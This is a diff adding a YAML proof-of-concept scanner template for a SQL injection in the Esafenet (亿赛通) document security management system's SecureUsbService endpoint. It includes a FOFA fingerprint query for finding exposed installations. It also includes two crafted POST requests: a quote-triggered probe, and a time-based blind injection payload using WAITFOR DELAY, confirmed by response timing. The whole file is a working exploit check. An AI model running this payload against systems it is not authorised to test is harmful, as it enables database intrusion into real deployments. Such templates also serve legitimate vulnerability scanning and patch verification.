@@ -1,0 +1,26 @@
+id: poc-yaml-yisaitong-esafenet-secureusbservice-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 SecureUsbService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /CDGServer3/device/SecureUsbService;login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: command=DelSecureUsb&id='
+  expression: status_code == 302 && contains(headers,"CDGServer3") && body == ""
+- method: POST
+  path: /CDGServer3/device/SecureUsbService;login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: command=DelSecureUsb&id=a';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 404 && contains(headers,"CDGServer3") && contains(body,"Freedom
+    LiFe") && duration > t1 && duration < t2
+transport: http
